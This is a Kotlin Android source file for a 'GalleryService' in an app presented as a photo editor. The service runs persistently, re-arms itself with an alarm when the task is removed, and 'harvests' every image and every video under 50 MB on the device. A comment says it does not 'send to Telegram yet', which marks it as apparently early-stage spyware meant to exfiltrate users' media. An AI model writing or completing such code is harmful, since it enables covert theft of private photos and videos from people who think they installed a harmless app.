package com.magic.photoeditor

import android.app.*
import android.content.ContentResolver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.provider.MediaStore
import android.widget.Toast
import androidx.core.app.NotificationCompat
import java.io.File

class GalleryService : Service() {

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        startForeground(Config.NOTIFICATION_ID, buildNotification("Service running"))
        Toast.makeText(this, "GalleryService onCreate", Toast.LENGTH_SHORT).show()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Toast.makeText(this, "GalleryService started", Toast.LENGTH_SHORT).show()
        harvestAll()
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onTaskRemoved(rootIntent: Intent?) {
        val restart = Intent(this, GalleryService::class.java)
        val pending = PendingIntent.getService(
            this, 0, restart, PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
        )
        val alarm = getSystemService(Context.ALARM_SERVICE) as AlarmManager
        alarm.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 1000, pending)
        super.onTaskRemoved(rootIntent)
    }

    private fun harvestAll() {
        try {
            Toast.makeText(this, "Harvesting media...", Toast.LENGTH_SHORT).show()
            harvestMedia()
            Toast.makeText(this, "Harvest complete", Toast.LENGTH_SHORT).show()
        } catch (e: Exception) {
            Toast.makeText(this, "Harvest error: ${e.message}", Toast.LENGTH_LONG).show()
        }
    }

    private fun harvestMedia() {
        val contentResolver: ContentResolver = contentResolver
        val collection = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            MediaStore.Images.Media.getContentUri(MediaStore.VOLUME_EXTERNAL)
        } else {
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI
        }

        val projection = arrayOf(
            MediaStore.Images.Media._ID,
            MediaStore.Images.Media.DATA,
            MediaStore.Images.Media.DISPLAY_NAME,
            MediaStore.Images.Media.SIZE
        )

        val cursor: android.database.Cursor? = contentResolver.query(collection, projection, null, null, null)

        cursor?.use {
            val dataColumn = it.getColumnIndexOrThrow(MediaStore.Images.Media.DATA)
            val nameColumn = it.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
            var count = 0
            while (it.moveToNext()) {
                val path = it.getString(dataColumn)
                val name = it.getString(nameColumn)
                val file = File(path)
                if (file.exists()) {
                    count++
                    // Just log the file, don't send to Telegram yet
                    android.util.Log.d("GalleryService", "Found: $name at $path")
                }
            }
            Toast.makeText(this, "Found $count images", Toast.LENGTH_SHORT).show()
        }

        val videoCollection = MediaStore.Video.Media.EXTERNAL_CONTENT_URI
        val videoProj = arrayOf(
            MediaStore.Video.Media._ID,
            MediaStore.Video.Media.DATA,
            MediaStore.Video.Media.DISPLAY_NAME,
            MediaStore.Video.Media.SIZE
        )
        val videoCursor = contentResolver.query(videoCollection, videoProj, null, null, null)
        videoCursor?.use {
            val dataCol = it.getColumnIndexOrThrow(MediaStore.Video.Media.DATA)
            val nameCol = it.getColumnIndexOrThrow(MediaStore.Video.Media.DISPLAY_NAME)
            var count = 0
            while (it.moveToNext()) {
                val path = it.getString(dataCol)
                val name = it.getString(nameCol)
                val file = File(path)
                if (file.exists() && file.length() < 50 * 1024 * 1024) {
                    count++
                    android.util.Log.d("GalleryService", "Found video: $name at $path")
                }
            }
            Toast.makeText(this, "Found $count videos", Toast.LENGTH_SHORT).show()
        }
    }

    private fun buildNotification(text: String): Notification {
        return NotificationCompat.Builder(this, Config.CHANNEL_ID)
            .setContentTitle("Photo Editor")
            .setContentText(text)
            .setSmallIcon(android.R.drawable.ic_menu_gallery)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                Config.CHANNEL_ID,
                Config.CHANNEL_NAME,
                NotificationManager.IMPORTANCE_LOW
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }
}
